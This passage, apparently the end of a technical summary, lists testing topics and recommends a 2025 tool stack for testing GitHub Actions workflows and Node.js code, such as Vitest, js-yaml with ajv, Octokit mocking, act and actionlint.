2. **Node.js Testing** - Native test runner, Vitest, Jest with ESM support
3. **Validation Testing** - YAML/JSON schema validation with js-yaml and ajv
4. **Integration Testing** - Mocking GitHub API with Octokit, testing github-script actions
5. **Security** - Secrets management, script injection prevention, best practices

**Recommended Stack for 2025**:

- **Test Framework**: Node.js native test runner or Vitest
- **Module System**: ESM (type: "module")
- **Validation**: js-yaml + ajv
- **API Testing**: @octokit/rest with custom fetch mocking
- **Local Workflow Testing**: act (nektos/act)
- **Workflow Linting**: actionlint

All tools and frameworks listed are production-ready and actively maintained as of 2025.
